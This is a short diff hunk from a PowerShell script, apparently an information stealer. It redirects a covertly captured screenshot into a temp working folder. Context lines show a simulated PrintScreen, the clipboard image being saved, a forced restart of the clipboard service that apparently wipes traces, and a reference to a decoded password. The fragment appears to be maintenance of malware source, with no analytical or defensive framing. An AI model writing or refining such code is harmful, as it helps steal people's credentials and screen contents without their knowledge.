@@ -897,7 +897,7 @@ Pass: $decodedPass
     [System.Windows.Forms.SendKeys]::SendWait("^{PrtSc}")
     Start-Sleep -Milliseconds 550
     $screenshot = [Windows.Forms.Clipboard]::GetImage()
-    $screenshotPath = "screenshot.png"
+    $screenshotPath = ("$main_temp\screenshot.png")
     $screenshot.Save($screenshotPath, [Drawing.Imaging.ImageFormat]::Png)
     $screenshot.Dispose()
     Restart-Service -Name "cbdhsvc*" -force
